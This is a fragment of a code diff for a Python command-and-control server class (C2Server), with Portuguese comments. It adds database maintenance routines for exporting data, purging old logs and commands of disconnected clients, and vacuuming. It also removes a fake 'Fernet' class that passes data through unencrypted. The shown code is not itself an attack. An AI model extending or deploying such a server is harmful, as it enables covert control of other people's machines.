+            console.print(f"[green]✅ Dados exportados para {export_file}[/green]")
+            
+        except Exception as e:
+            console.print(f"[red]✗ Erro ao exportar dados: {str(e)}[/red]")
+        
+        time.sleep(1)
+    
+    def _limpar_dados_antigos(self):
+        """Limpa dados antigos do banco de dados"""
+        try:
+            dias = IntPrompt.ask(
+                "[yellow]?[/yellow] Limpar dados com mais de quantos dias?",
+                default=30
+            )
+            
+            cursor = self.db_conn.cursor()
+            
+            # Calcular data limite
+            limite = (datetime.now() - timedelta(days=dias)).isoformat()
+            
+            # Limpar logs antigos
+            cursor.execute("DELETE FROM activity_logs WHERE timestamp < ?", (limite,))
+            logs_apagados = cursor.rowcount
+            
+            # Limpar comandos antigos de clientes desconectados
+            cursor.execute('''DELETE FROM commands 
+                            WHERE timestamp < ? 
+                            AND client_id IN (SELECT id FROM clients WHERE status = 'disconnected')''',
+                         (limite,))
+            commands_apagados = cursor.rowcount
+            
+            self.db_conn.commit()
+            
+            console.print(f"[green]✅ Dados limpos: {logs_apagados} logs e {commands_apagados} comandos removidos[/green]")
+            
+        except Exception as e:
+            console.print(f"[red]✗ Erro ao limpar dados: {str(e)}[/red]")
+        
+        time.sleep(1)
+    
+    def _otimizar_bd(self):
+        """Otimiza o banco de dados"""
+        try:
+            cursor = self.db_conn.cursor()
+            
+            # Executar VACUUM para otimizar
+            cursor.execute("VACUUM")
+            self.db_conn.commit()
+            
+            console.print("[green]✅ Banco de dados otimizado com sucesso[/green]")
+            
+        except Exception as e:
+            console.print(f"[red]✗ Erro ao otimizar BD: {str(e)}[/red]")
+        
+        time.sleep(1)
+    
     def _sair(self):
         """Procedimento de saída"""
         if self.running:
@@ -789,21 +1250,6 @@ class C2Server:
         ))
         time.sleep(1)
         sys.exit(0)
-
-# Classe Fernet fallback para quando não estiver disponível
-class Fernet:
-    @staticmethod
-    def generate_key():
-        return base64.urlsafe_b64encode(os.urandom(32))
-    
-    def __init__(self, key):
-        self.key = key
-    
-    def encrypt(self, data):
-        return data
-    
-    def decrypt(self, data):
-        return data
 
 def main():
     c2_server = C2Server()
